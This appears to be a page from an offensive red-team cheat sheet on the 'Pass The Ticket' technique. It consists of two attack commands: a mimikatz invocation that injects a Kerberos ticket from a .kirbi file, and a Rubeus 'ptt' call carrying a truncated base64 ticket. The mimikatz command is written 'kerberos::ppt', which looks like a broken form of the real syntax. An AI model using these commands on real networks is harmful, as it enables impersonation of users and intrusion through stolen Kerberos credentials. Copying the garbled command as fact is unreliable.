---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion/use-alternate-authentication-material/pass-the-ticket
---

# Pass The Ticket

```powershell
# mimikatz
mimikatz.exe "kerberos::ppt admin.kirbi"

# Rubeus
Rubeus_PTH.exe ptt /ticket:doIFDDCCBQigAwIBBaEDAgEWooIEFDCCBBBhggQMMIIECKADAgEFoQ4
```
